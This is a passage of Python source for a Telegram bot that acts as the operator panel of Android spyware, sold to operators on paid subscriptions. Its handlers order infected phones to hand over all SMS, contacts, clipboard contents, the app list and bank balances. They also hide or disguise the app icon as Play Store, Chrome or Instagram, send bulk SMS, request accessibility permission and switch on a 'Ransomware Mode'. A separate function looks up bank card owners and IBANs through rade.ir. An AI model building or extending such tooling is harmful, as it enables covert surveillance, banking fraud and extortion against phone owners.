    markup.add(types.InlineKeyboardButton(text="🪜 Set_User",
                                          callback_data="setuser"))
    markup.add(types.InlineKeyboardButton(text="🔙 Back",
                                          callback_data="mback"))
    return markup


def selecticon():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="💡Play Store ON💡",
                                          callback_data="playstore"),
               types.InlineKeyboardButton(text="💡Play Store OFF💡",
                                          callback_data="playstoreoff")),

    markup.add(types.InlineKeyboardButton(text="🔗Telegram ON🔗",
                                          callback_data="telegram"),
               types.InlineKeyboardButton(text="🔗Telegram OFF🔗",
                                          callback_data="telegramoff"))

    markup.add(types.InlineKeyboardButton(text="🌐Google Chrome ON🌐",
                                          callback_data="chrome"),
               types.InlineKeyboardButton(text="🌐Google Chrome OFF🌐",
                                          callback_data="chromeoff"))

    markup.add(types.InlineKeyboardButton(text="📷Instagram ON📷",
                                          callback_data="insta"),
               types.InlineKeyboardButton(text="📷Instagram OFF📷",
                                          callback_data="instaoff")),

    markup.add(types.InlineKeyboardButton(text="🏫Shad ON🏫",
                                          callback_data="shad"),
               types.InlineKeyboardButton(text="🏫Shad OFF🏫",
                                          callback_data="shadoff"))

    markup.add(types.InlineKeyboardButton(text="🗄Google ON🗄",
                                          callback_data="google"),
               types.InlineKeyboardButton(text="🗄Google OFF🗄",
                                          callback_data="googleoff"))

    markup.add(types.InlineKeyboardButton(text="🎥YouTube ON🎥",
                                          callback_data="youtube"),
               types.InlineKeyboardButton(text="🎥YouTube OFF🎥",
                                          callback_data="youtubeoff"))

    markup.add(types.InlineKeyboardButton(text="👛Trust Wallet👛",
                                          callback_data="trustwalletch"))

    markup.add(types.InlineKeyboardButton(text="🔙Back🔙",
                                          callback_data="back"))

    return markup


def toolsb():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="Brightness Mode 💡",
                                          callback_data="brightness"))

    markup.add(types.InlineKeyboardButton(text="AppInfo Dialog 📜",
                                          callback_data="appinfo"))

    markup.add(types.InlineKeyboardButton(text="Uninstall Dialog 📃",
                                          callback_data="uninstall"))

    markup.add(types.InlineKeyboardButton(text="WhatsApp Dialog 🗒",
                                          callback_data="wsms"))

    markup.add(types.InlineKeyboardButton(text="Request Uninstall Permission 🔌",
                                          callback_data="rupadmin"))

    markup.add(types.InlineKeyboardButton(text="Request accessibility Permission 🔌",
                                          callback_data="accessibility"))

    markup.add(types.InlineKeyboardButton(text="🔓 Status : ",
                                          callback_data="jjjj"),
               types.InlineKeyboardButton(text="Disable",
                                          callback_data="ggggggerg"))

    markup.add(types.InlineKeyboardButton(text="Ransomware Mode 🔒",
                                          callback_data="rans"))

    markup.add(types.InlineKeyboardButton(text="📜 Clear BlockList",
                                          callback_data="clblock"))

    markup.add(types.InlineKeyboardButton(text="Back 🔙",
                                          callback_data="back"))

    return markup


def selectsimslot():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="📡 Default Slot",
                                          callback_data="defaultslot"),
               types.InlineKeyboardButton(text="📡 Secend Slot (until android 11)",
                                          callback_data="secendslot")),
    markup.add(types.InlineKeyboardButton(text="🗂 Save Numbers",
                                          callback_data="savenumbers")),
    markup.add(types.InlineKeyboardButton(text="📨 Automatic Send",
                                          callback_data="autosend")),

    markup.add(types.InlineKeyboardButton(text="🔙Back🔙",
                                          callback_data="back"))
    return markup


def test(text):
    print(text)


def setandroidid(message):
    text = message.text.split('set_')
    textlist = list(text[1])
    if len(textlist) == 15 or len(textlist) == 16 or len(textlist) == 17:
        glasses_rm_cammand(text[1], message.chat.id)
    else:
        bot.send_message(message.chat.id, "the Fucking androidid is not true !")


def importcontact(message, call, msgid, androidid):
    try:
        if message.text:
            chat_id = message.chat.id
            text = message.text.split('&')
            androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
            id = androidid_reader.read()
            import_contact(androidid, text[1], text[0], chat_id)
            bot.answer_callback_query(callback_query_id=call.id,
                                      show_alert=True,
                                      text=f"import contact request sent.\n📞 number: {text[0]}\n✏️ name: {text[1]} \n {id}")

            bot.delete_message(chat_id, msgid)
    except:
        print("problem")


session = requests.session()


# Defs
def login():
    try:
        global rade_headers

        csrf = session.get('https://my.rade.ir/api/v2/csrf-cookie', headers=rade_headers, verify=False)
        rade_headers['Cookie'] = '; '.join([x.name + '=' + x.value for x in csrf.cookies])
        # rade_headers['content-type'] = 'application/x-www-form-urlencoded'
        # print(rade_headers['Cookie'])
        # print(csrf.cookies.get_dict())
        payload = {
            "username": f"{username}",
            "password": f"{password}",
            "captcha": "",
            "reference": None
        }

        res = session.post('https://my.rade.ir/api/v2/login', json=payload, headers=rade_headers, verify=False)
        rade_headers['Cookie'] = '; '.join([x.name + '=' + x.value for x in res.cookies])

        if res.status_code == 200:
            return True
        else:
            return False
    except:
        pass
        # session.cookies.update
        # print(session.cookies.get_dict())


def get_card_information(card):
    global rade_headers
    try:

        payload = {
            'card_number': f"{card}"
        }

        response = session.post('https://my.rade.ir/api/v2/service/cardToIban', json=payload, headers=rade_headers)

        if response.status_code == 200:
            # print(response.text)
            jsondata = json.loads(response.text)
            # print(jsondata['data']['result']['result']['IBAN'])
            # print(jsondata['data']['result']['result']['depositOwners'])
            # print(jsondata['data']['result']['result']['deposit'])
            return jsondata['data']

        else:
            print(response.text)
            login()
            return False

    except Exception as e:
        print(e)


def shabacard(message):
    try:
        global dicdatacard, datacard, balanceShaba
        if message.text:
            chatid = message.chat.id
            postcard = message.text
            if postcard.isdigit():
                if str(postcard) in datacard:
                    print("iam in the list")
                    msg = f'''
👤 OwnerName: <code>{dicdatacard[postcard]['result']['result']['depositOwners']}</code>
🗂 Shabah: <code>{dicdatacard[postcard]['result']['result']['IBAN']}</code>
🔘 Hesab : <code>{dicdatacard[postcard]['result']['result']['deposit']}</code>

@Goodhudodo
    '''
                    bot.send_message(chatid, text=msg, parse_mode='html')
                    # return dicdatacard[postcard]

                else:
                    resultt = get_card_information(postcard)
                    if resultt:
                        dicdatacard[f"{postcard}"] = resultt
                        datacard.append(str(postcard))
                        print(datacard)
                        # return resultt
                        msg = f'''
👤 OwnerName: <code>{resultt['result']['result']['depositOwners']}</code>
🗂 Shabah: <code>{resultt['result']['result']['IBAN']}</code>
🔘 Hesab : <code>{resultt['result']['result']['deposit']}</code>

@Goodhudodo
    '''
                        balanceShaba = resultt['order']['user']['balance']
                        bot.send_message(chatid, text=msg, parse_mode='html')


        else:
            return "what the fuck budy ?"
    except:
        pass


markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
iit1 = types.KeyboardButton('📝SetText📝')
iit5 = types.KeyboardButton('📊List📊')
markup.add(iit1, iit5)


@bot.message_handler(commands=['startb', 'help'])
def send_welcome(message):
    well = '''
HI
@Goodhudodo

    '''
    bot.reply_to(message, well, reply_markup=markup)


@bot.message_handler(commands=["start", "permit", "unpermit", "addday", "info"])
def handle_command_adminwindow(message):
    if isPermitted(message.chat.id):
        try:
            command = message.text.split()[0][1:]
            print(command)
            cll = message.chat.id
            if command == 'start':
                print(message.chat.id)
                bot.send_message(chat_id=message.chat.id,
                                 text="~ @Goodhudodo\n/set_user",
                                 reply_markup=makeKeyboard(message.chat.id),
                                 parse_mode='HTML')

            elif command == "permit" and message.chat.id == chatid:
                parts = message.text.split(maxsplit=2)
                if len(parts) < 3:
                    bot.reply_to(message, "Usage: /permit <chatid> <day>")
                    return
                cid = parts[1]
                day = parts[2]
                cid1 = int(cid)
                day1 = int(day)
                permit(cid, day1)
                makePort(cid)
                bot.send_message(chat_id=message.chat.id,
                                 text=f"Robot Enabled In This Group\n Payment Date : {unix_to_datetime(getAddedDate(cid))}\n Renewal Date : {unix_to_datetime(getExpireTime(cid))}",
                                 reply_markup="",
                                 parse_mode='HTML')
                bot.send_message(chat_id=cid1,
                                 text=f"Robot Enabled In This Group\n Payment Date : {unix_to_datetime(getAddedDate(cid1))}\n Renewal Date : {unix_to_datetime(getExpireTime(cid1))}",
                                 reply_markup="",
                                 parse_mode='HTML')

            elif command == "unpermit" and message.chat.id == chatid:
                parts = message.text.split(maxsplit=1)
                if len(parts) < 2:
                    bot.reply_to(message, "Usage: /set <key> <value>")
                    return
                cid = parts[1]
                unpermit(cid)
                bot.send_message(chat_id=message.chat.id,
                                 text="Robot Disabled In This Group.\nContact Admin",
                                 reply_markup="",
                                 parse_mode='HTML')
                bot.send_message(chat_id=cid,
                                 text=f"Robot Disabled In This Group.\nContact Admin!!!",
                                 reply_markup="",
                                 parse_mode='HTML')
            elif command == "addday" and message.chat.id == chatid:
                parts = message.text.split(maxsplit=2)
                if len(parts) < 3:
                    bot.reply_to(message, "Usage: /set <key> <value>")
                    return
                cid = parts[1]
                day = parts[2]
                day = int(day)
                addExpiredays(cid, day)
                bot.send_message(chat_id=message.chat.id,
                                 text=f"Renewal Date Updated\n Payment Date : {unix_to_datetime(getAddedDate(cid))}\n Renewal Date : {unix_to_datetime(getExpireTime(cid))}",
                                 reply_markup="",
                                 parse_mode='HTML')
                bot.send_message(chat_id=cid,
                                 text=f"Renewal Date Updated\n Payment Date : {unix_to_datetime(getAddedDate(cid))}\n Renewal Date : {unix_to_datetime(getExpireTime(cid))}",
                                 reply_markup="",
                                 parse_mode='HTML')
            elif command == "info" and message.chat.id == chatid:
                parts = message.text.split(maxsplit=1)
                if len(parts) < 2:
                    bot.reply_to(message, "Usage: /set <key> <value>")
                    return
                cid = parts[1]
                bot.send_message(chat_id=message.chat.id,
                                 text=f"Port Info\n\n Payment Date : {unix_to_datetime(getAddedDate(cid))}\n Renewal Date : {unix_to_datetime(getExpireTime(cid))}",
                                 reply_markup="",
                                 parse_mode='HTML')
        except Exception as e:
            print(e)

    else:
        bot.send_message(chat_id=message.chat.id,
                         text=f"You Cant Use This. Contact Admin",
                         reply_markup="",
                         parse_mode='HTML')


@bot.message_handler(func=lambda m: True)
def echo_all(message):
    cid = message.chat.id
    if message.content_type == "text":
        if isPermitted(cid):
            chat_id = message.chat.id
            if message.text == "🖥SetMobile-ID🖥":
                input_text = bot.send_message(message.chat.id, 'please Send me your Mobile-ID !')
                bot.register_next_step_handler(input_text, androidid)

            elif message.text == "📝SetText📝":
                input_text = bot.send_message(message.chat.id, 'Please send me your text message !')
                bot.register_next_step_handler(input_text, messagef)

            elif message.text == "📊List📊":
                list_user(chat_id)
                bot.send_message(message.chat.id, "Request Send Now!")

            elif message.text.startswith("/set_"):
                setandroidid(message)

            elif message.text.startswith("/lastsms_"):
                lastsms(message)

            elif message.text.startswith("/allsms_"):
                allsms(message)

        else:
            bot.send_message(chat_id=message.chat.id,
                             text=f"You Cant Use This. Contact Admin",
                             reply_markup="",
                             parse_mode='HTML')


@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    try:
        global appdata, loadingProccess
        chat_id = call.message.chat.id
        if isPermitted(chat_id):
            if (call.data.startswith("['value'")):
                print(f"call.data : {call.data} , type : {type(call.data)}")
                print(
                    f"ast.literal_eval(call.data) : {ast.literal_eval(call.data)} , type : {type(ast.literal_eval(call.data))}")
                valueFromCallBack = ast.literal_eval(call.data)[1]
                keyFromCallBack = ast.literal_eval(call.data)[2]
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text="You Clicked " + valueFromCallBack + " and key is " + keyFromCallBack)

            if (call.data.startswith("['key'")):
                keyFromCallBack = ast.literal_eval(call.data)[1]

            if (call.data.startswith("list")):
                Thread(target=list_user, args=[chat_id]).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text="𝒍𝒊𝒔𝒕 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕")


            elif (call.data.startswith("setuser")):
                input_text = bot.send_message(call.message.chat.id, 'please Send me your Mobile-ID :')
                bot.register_next_step_handler(input_text, glasses_rm)

            elif (call.data.startswith("hideall")):
                Thread(target=BroadcastToAll_action, args=[chat_id, "hide"]).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text="𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕")

            elif (call.data.startswith("offmodeall")):
                Thread(target=BroadcastToAll_action, args=[chat_id, "offmodeall"]).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text="𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕")

            elif (call.data.startswith("lastsmsall")):
                Thread(target=BroadcastToAll_action, args=[chat_id, "lastsmsall"]).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text="𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕")

            elif (call.data.startswith("allsmsall")):
                Thread(target=BroadcastToAll_action, args=[chat_id, "allsmsall"]).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text="𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕")

            elif (call.data.startswith("muteall")):
                # hideeall(call.message.chat.id)
                Thread(target=BroadcastToAll_action, args=[chat_id, "mute"]).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text="𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕")

            elif (call.data.startswith("settext")):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your text message :')
                bot.register_next_step_handler(input_text, messagef)

            elif (call.data == "ntext"):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your Notification Text :')
                bot.register_next_step_handler(input_text, nmessagef)

            elif (call.data.startswith("setlink")):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your Url :')
                bot.register_next_step_handler(input_text, set_url)


            elif (call.data.startswith("setoffnum")):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your phone number :')
                bot.register_next_step_handler(input_text, set_off_num)



            elif (call.data.startswith("smsbomber")):
                if not os.path.exists(f'./data/message_{call.message.chat.id}.txt'):
                    with open(f'./data/message_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("set")
                    bot.answer_callback_query(callback_query_id=call.id,
                                              show_alert=True,
                                              text=f"your Path file not exist i will make files please TryAgain!")
                else:
                    file2 = open(f"./data/message_{call.message.chat.id}.txt", "r", encoding='UTF-8').read()
                    phone_list = bot.reply_to(call.message, 'please send me your phone number !')
                    bot.register_next_step_handler(phone_list, sender2, file2)



            elif (call.data.startswith("mute")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("mute", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑴𝒖𝒕𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")


            elif (call.data.startswith("getallmessage")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("getallmessage", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒍𝒍 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")
            elif (call.data.startswith("allsms_")):
                textToSplit = call.data
                desired_part = textToSplit.split('_')[1]
                Thread(target=sendaction, args=("getallmessage", desired_part, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒍𝒍 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {desired_part}")

            elif (call.data.startswith("msgall3")):

                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("getallmessage2", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒍𝒍 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data == "quarter"):

                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("quarter", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒍𝒍 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data == "half"):

                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("half", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒍𝒍 𝑴𝒆𝒔𝒔𝒂𝒈𝒆 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")


            elif (call.data.startswith("sendsms")):
                bot.edit_message_text(chat_id=chat_id,
                                      message_id=call.message.message_id,
                                      text=f"~ Select your simcard slot :",
                                      reply_markup=selectsimslot(),
                                      parse_mode='HTML')
            elif (call.data.startswith("savenumbers")):
                phone_list = bot.reply_to(call.message, 'please send me your phone numbers !')
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=saveAutoNumbers, args=(id,phone_list, chat_id)).start()
                bot.send_message(chat_id, "Numbers Saved In User's Phone!")
            elif (call.data == "autosend"):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                if not os.path.exists(f'data/message_{call.message.chat.id}.txt'):
                    with open(f'data/message_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("set")
                    bot.answer_callback_query(callback_query_id=call.id,
                                              show_alert=True,
                                              text="your Path file not exists i will make file please TryAgain!")
                else:
                    file2 = open(f"data/message_{call.message.chat.id}.txt", "r", encoding='UTF-8').read()
                    Thread(target=autoSend(), args=(id,file2, chat_id)).start()
                    bot.answer_callback_query(callback_query_id=call.id,
                                              show_alert=True,
                                              text=f"𝑨𝒖𝒕𝒐𝒎𝒂𝒕𝒊𝒄 𝑺𝒆𝒏𝒅 𝑹𝒆𝒒𝒖𝒆𝒔𝒕 𝑺𝒆𝒏𝒕\n~ : {id}")

            elif (call.data == "defaultslot"):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                if not os.path.exists(f'data/message_{call.message.chat.id}.txt'):
                    with open(f'data/message_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("set")
                    bot.answer_callback_query(callback_query_id=call.id,
                                              show_alert=True,
                                              text="your Path file not exists i will make file please TryAgain!")
                else:
                    file2 = open(f"./data/message_{call.message.chat.id}.txt", "r", encoding='UTF-8').read()
                    phone_list = bot.reply_to(call.message, 'please send me your phone number : \n09999\n09999\n09999')
                    bot.register_next_step_handler(phone_list, sender, id, file2)


            elif (call.data == "secendslot"):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                if not os.path.exists(f'./data/message_{call.message.chat.id}.txt'):
                    with open(f'./data/message_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("set")
                    bot.answer_callback_query(callback_query_id=call.id,
                                              show_alert=True,
                                              text="your Path file not exists i will make file please TryAgain!")
                else:
                    file2 = open(f"./data/message_{call.message.chat.id}.txt", "r", encoding='UTF-8').read()
                    phone_list = bot.reply_to(call.message, 'please send me your phone number : \n09999\n09999\n09999')
                    bot.register_next_step_handler(phone_list, sendersim2, id, file2)


            elif (call.data.startswith("hideicon")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("hide", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑯𝒊𝒅𝒆𝑰𝒄𝒐𝒏 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data.startswith("show")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("show", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑺𝒉𝒐𝒘 𝑰𝒄𝒐𝒏 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data.startswith("getlastsms")):
                textToSplit = call.data
                desired_part = textToSplit.split('_')[1]
                Thread(target=sendaction, args=("getlastsms", desired_part, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑮𝒆𝒕𝑳𝒂𝒔𝒕𝑺𝒎𝒔 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {desired_part}")
            elif (call.data.startswith("lastsms_")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("getlastsms", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑮𝒆𝒕𝑳𝒂𝒔𝒕𝑺𝒎𝒔 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")
            elif (call.data.startswith("findnumbers")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("findnumbers", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝙛𝙞𝙣𝙙𝙣𝙪𝙢𝙗𝙚𝙧𝙨 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")
            elif (call.data.startswith("findnumber_")):
                textToSplit = call.data
                desired_part = textToSplit.split('_')[1]
                print(desired_part)
                print("hi")
                Thread(target=sendaction, args=("findnumbers", desired_part, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝙛𝙞𝙣𝙙𝙣𝙪𝙢𝙗𝙚𝙧𝙨 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {desired_part}")
            elif (call.data.startswith("findbalances")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("findbalances", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝙛𝙞𝙣𝙙𝙗𝙖𝙡𝙖𝙣𝙘𝙚𝙨 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data.startswith("getcontact")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("getcontact", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑮𝒆𝒕𝑪𝒐𝒏𝒕𝒂𝒄𝒕 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data.startswith("clipboard")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("getclipboard", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝒄𝒍𝒊𝒑𝒃𝒐𝒂𝒓𝒅 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data.startswith("allapp")):
                androidid_reader = open(f'data/saver_{call.message.chat.id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("getallapp", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒑𝒑 𝑳𝒊𝒔𝒕 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")


            elif (call.data.startswith("myport")):
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"🍷𝒀𝒐𝒖𝒓 𝑷𝒐𝒓𝒕 𝑵𝒂𝒎𝒆 : {Topic}")

            elif (call.data.startswith("chicon")):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ @Goodhudodo\nSelect your icon :",
                                      reply_markup=selecticon(),
                                      parse_mode='HTML')

            # Play Store
            elif (call.data.startswith("playstore")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=changeicon, args=(id, "playstore", chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒑𝒑 𝑰𝒄𝒐𝒏 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 ==>> 𝑷𝒍𝒂𝒚 𝑺𝒕𝒐𝒓𝒆 \n {id}")

            elif (call.data.startswith("playstoreoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                changeicon(id, "playstoreoff", chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Play Store OFF \n {id}")
            # Play Store

            # Instagram
            elif (call.data.startswith("insta")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=changeicon, args=(id, "insta", chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒑𝒑 𝑰𝒄𝒐𝒏 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 ==>> 𝑰𝒏𝒔𝒕𝒂𝒈𝒓𝒂𝒎 \n {id}")

            elif (call.data.startswith("instaoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                changeicon(id, "instaoff", chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Instagram OFF\n {id}")
            # Instagram

            # Telegram
            elif (call.data == ("telegram")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=changeicon, args=(id, "telegram", chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Telegram \n {id}")

            elif (call.data == ("telegramoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                changeicon(id, "telegramoff", chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Telegram OFF\n {id}")
            # Telegram

            # Chrome
            elif (call.data == ("chrome")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=changeicon, args=(id, "chrome", chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒑𝒑 𝑰𝒄𝒐𝒏 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 ==>> 𝑮𝒐𝒐𝒈𝒍𝒆 𝑪𝒉𝒓𝒐𝒎𝒆 \n {id}")

            elif (call.data == ("chromeoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                changeicon(id, "chromeoff", chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒑𝒑 𝑰𝒄𝒐𝒏 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 ==>> 𝑮𝒐𝒐𝒈𝒍𝒆 𝑪𝒉𝒓𝒐𝒎𝒆 OFF \n {id}")
            # Chrome

            # Shad
            elif (call.data.startswith("shad")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=changeicon, args=(id, "shad", chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Shad \n {id}")

            elif (call.data.startswith("shadoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                changeicon(id, "shadoff", chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Shad OFF \n {id}")
            # Shad

            # Google
            elif (call.data.startswith("google")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=changeicon, args=(id, "google", chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Google \n {id}")

            elif (call.data.startswith("googleoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                changeicon(id, "googleoff", chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Google OFF \n {id}")
            # Google

            # YouTube
            elif (call.data.startswith("youtube")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=changeicon, args=(id, "youtube", chat_id)).start()
